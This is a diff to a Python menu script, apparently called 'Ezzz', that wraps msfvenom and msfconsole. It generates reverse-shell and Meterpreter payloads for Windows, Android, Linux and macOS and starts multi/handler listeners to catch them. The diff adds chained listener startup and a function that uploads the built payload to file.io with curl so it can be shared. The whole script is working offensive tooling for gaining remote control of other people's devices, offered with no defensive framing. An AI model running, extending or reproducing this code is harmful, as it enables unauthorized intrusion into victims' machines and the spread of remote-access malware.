@@ -18,7 +18,7 @@ def ipsqr():
 	publicip()
 	print(color.END+color.RED+"-----------------"+color.END)	
 #-----------------------------------------------------
-def ask():
+def payload_inpt():
 	global ip,portno,pname
 	ip = input("Enter IP Address : ")
 	portno = input("Enter Unique Port No : ")
@@ -32,6 +32,66 @@ def payload_lnx():
 	os.system('msfvenom -p linux/x86/meterpreter/reverse_tcp lhost='+ip+' lport='+portno+' -f elf -o ~/Desktop/'+pname+'.elf')
 def payload_mac():
 	os.system('msfvenom -p osx/x86/shell_reverse_tcp lhost='+ip+' lport='+portno+' -f macho -o ~/Desktop/'+pname+'.macho')	
+#-----------------------------------------------------
+def lsnr_inpt():
+	global ip,portno	
+	ip = input("Enter IP Address : ")
+	portno = input("Enter Unique Port No : ")
+	print(color.YELLOW+color.BOLD + "Starting Listener..." + color.END)
+def lsnr_win():
+	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
+	os.system(cmnd)
+def lsnr_and():
+	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
+	os.system(cmnd)
+def lsnr_lnx():
+	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"
+	os.system(cmnd)
+def lsnr_mac():
+	cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD osx/x86/shell_reverse_tcp; exploit'"
+	os.system(cmnd)
+#-----------------------------------------------------
+def fileio():
+	yn = input(color.BLUE+color.BOLD+"Do you want to host/upload this upload to share it further? (y/n)\n"+color.END)	
+	if yn == 'y' or yn == 'Y' or yn == 'yes' or yn == 'YES':
+		if payload == 1:
+			path = "/root/Desktop/"+pname+".exe"
+			cmnd = "curl -F file=@"+path+" https://file.io"
+			os.system(cmnd)
+		elif payload == 2:
+			path = "/root/Desktop/"+pname+".apk"
+			cmnd = "curl -F file=@"+path+" https://file.io"
+			os.system(cmnd)
+		elif payload == 3:
+			path = "/root/Desktop/"+pname+".elf"
+			cmnd = "curl -F file=@"+path+" https://file.io"
+			os.system(cmnd)
+		elif payload == 4:
+			path = "/root/Desktop/"+pname+".macho"
+			cmnd = "curl -F file=@"+path+" https://file.io"
+			os.system(cmnd)
+	elif yn == 'n' or yn == 'N' or yn == 'no' or yn == 'NO':
+		return 0
+	else:
+		print(color.CYAN+color.BOLD+"LOL, What you really want to do?\nJust say"+color.GREEN+" YES"+color.END+" or"+color.RED+color.BOLD+" NO."+color.YELLOW+color.BOLD+" But you lost this chance, try again now."+color.END)
+#-----------------------------------------------------
+def cont_lsnr():
+	yn = str(input(color.GREEN+color.BOLD+"\nDo you want to start listener too? (y/n)\n"+color.END))
+	if yn == 'y' or yn == 'Y' or yn == 'yes' or yn == 'YES':
+		clear()
+		print(color.YELLOW+color.BOLD+"Starting Listener..."+color.END)
+		if payload == 1:
+			lsnr_win()
+		elif payload == 2:
+			lsnr_and()
+		elif payload == 3:
+			lsnr_lnx()
+		elif payload == 4:
+			lsnr_mac()
+	elif yn == 'n' or yn == 'N' or yn == 'no' or yn == 'NO':
+		return 0
+	else:
+		print(color.CYAN+color.BOLD+"LOL, What you really want to do?\nJust say"+color.GREEN+" YES"+color.END+" or"+color.RED+color.BOLD+" NO."+color.YELLOW+color.BOLD+" But you lost this chance, try again now."+color.END)
 #-----------------------------------------------------
 class color:
    PURPLE = '\033[95m'
@@ -70,35 +130,40 @@ if val == 1:
 		clear()
 		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  1) Create Payload > 1) Windows"+color.END)
 		ipsqr()
-		ask()		
+		payload_inpt()		
 		print(color.YELLOW+color.BOLD+"\nCreating Windows payload..."+color.END)
 		payload_win()
-	if payload == 2:
+		cont_lsnr()
+		fileio()
+	elif payload == 2:
 		clear()
 		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  1) Create Payload > 2) Android"+color.END)
 		ipsqr()
-		ask()
-		print(color.YELLOW+color.BOLD+"Creating Android payload..."+color.END)
+		payload_inpt()
+		print(color.YELLOW+color.BOLD+"\nCreating Android payload..."+color.END)
 		payload_and()
-	if payload == 3:
+		cont_lsnr()
+	elif payload == 3:
 		clear()
 		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  1) Create Payload > 3) Linux"+color.END)
 		ipsqr()
-		ask()
-		print(color.YELLOW+color.BOLD+"Creating Linux payload..."+color.END)
+		payload_inpt()
+		print(color.YELLOW+color.BOLD+"\nCreating Linux payload..."+color.END)
 		payload_lnx()
-	if payload == 4:
+		cont_lsnr()
+	elif payload == 4:
 		clear()
 		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  1) Create Payload > 4) Mac"+color.END)
 		ipsqr()
-		ask()
-		print(color.YELLOW+color.BOLD+"Creating Mac payload..."+color.END)
+		payload_inpt()
+		print(color.YELLOW+color.BOLD+"\nCreating Mac payload..."+color.END)
 		payload_mac()
-	if payload == 5:
+		cont_lsnr()
+	elif payload == 5:
 		clear()
 		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  1) Create Payload > 5) Create for all of above at once"+color.END)
 		ipsqr()
-		ask()
+		payload_inpt()
 		print(color.YELLOW+color.BOLD+"\nCreating Windows payload..."+color.END)
 		payload_win()
 		print(color.YELLOW+color.BOLD+"Windows payload created at ~/Desktop/"+pname+".exe"+color.END)
@@ -114,10 +179,12 @@ if val == 1:
 		print(color.YELLOW+color.BOLD+"\nCreating Mac payload..."+color.END)
 		payload_mac()
 		print(color.YELLOW+color.BOLD+"Mac payload created at ~/Desktop/"+pname+".macho"+color.END)
-	if val == 99:
+	elif val == 99:
 	    exit
 
-if val == 2:
+elif val == 2:
+	clear()
+	print(color.BLUE+color.BOLD+"You are at:\nEzzz >  2) Start Listener")
 	print(color.YELLOW+color.BOLD+"\nSelect Listener For Your Payload Accordingly\n"+color.END)
 	print(color.GREEN + color.BOLD + "1) Windows")
 	print("2) Android")
@@ -126,32 +193,28 @@ if val == 2:
 	print("99) Exit"+ color.END)
 	listener = int(input("Select Option : "))
 	if listener == 1:
-		ip = input("Enter IP Address : ")
-		portno = input("Enter Unique Port No : ")
-		print(color.YELLOW + "Just a second..." + color.END)
-		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD windows/meterpreter/reverse_tcp; exploit'"
-		os.system(cmnd)
-	if listener == 2:
-		ip = input("Enter IP Address : ")
-		portno = input("Enter Unique Port No : ")
-		print(color.YELLOW + "Just a second..." + color.END)
-		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD android/meterpreter/reverse_tcp; exploit'"
-		os.system(cmnd)
-	if listener == 3:
-		ip = input("Enter IP Address : ")
-		portno = input("Enter Unique Port No : ")
-		print(color.YELLOW + "Just a second..." + color.END)
-		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD linux/x86/meterpreter/reverse_tcp; exploit'"
-		os.system(cmnd)
-	if listener == 4:
-		ip = input("Enter IP Address : ")
-		portno = input("Enter Unique Port No : ")
-		print(color.YELLOW + "Just a second..." + color.END)
-		cmnd = "msfconsole -x 'use multi/handler; set LHOST "+ip+"; set LPORT "+portno+"; set PAYLOAD osx/x86/shell_reverse_tcp; exploit'"
-		os.system(cmnd)
-	if val == 99:
+		clear()
+		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  2) Start Listener > 1) Windows"+color.END)
+		lsnr_inpt()
+		lsnr_win()
+	elif listener == 2:
+		clear()
+		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  2) Start Listener > 2) Android"+color.END)
+		lsnr_inpt()
+		lsnr_and()
+	elif listener == 3:
+		clear()
+		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  2) Start Listener > 3) Linux"+color.END)
+		lsnr_inpt()
+		lsnr_lnx()
+	elif listener == 4:
+		clear()
+		print(color.BLUE+color.BOLD+"You are at:\nEzzz >  2) Start Listener > 4) Mac"+color.END)
+		lsnr_inpt()
+		lsnr_mac()
+	elif val == 99:
 		exit
-if val == 99:
+elif val == 99:
 	exit
 else:
 	print(color.RED+color.BOLD+"\nSelect from available options only, Obviously.\n"+color.END)
